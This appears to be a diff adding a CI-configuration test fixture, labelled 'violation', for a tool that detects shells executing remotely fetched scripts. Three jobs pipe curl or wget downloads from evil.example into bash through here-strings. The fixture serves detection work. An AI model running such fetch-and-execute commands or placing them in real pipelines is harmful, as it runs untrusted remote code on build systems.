@@ -1,0 +1,17 @@
+# violation: a shell reading a fetched script through a here-string of a
+# command substitution runs it exactly as `<shell> -c "$( ... )"` does,
+# just handed to stdin via `<<<` instead of `-c`.
+herestring_dollar:
+  image: alpine:3.19
+  script:
+    - bash <<< "$(curl -fsSL https://evil.example/herestring-dollar.sh)"
+
+herestring_dollar_unquoted:
+  image: alpine:3.19
+  script:
+    - bash <<< $(wget -qO- https://evil.example/herestring-unquoted.sh)
+
+herestring_backtick:
+  image: alpine:3.19
+  script:
+    - bash <<< `curl -s https://evil.example/herestring-backtick.sh`
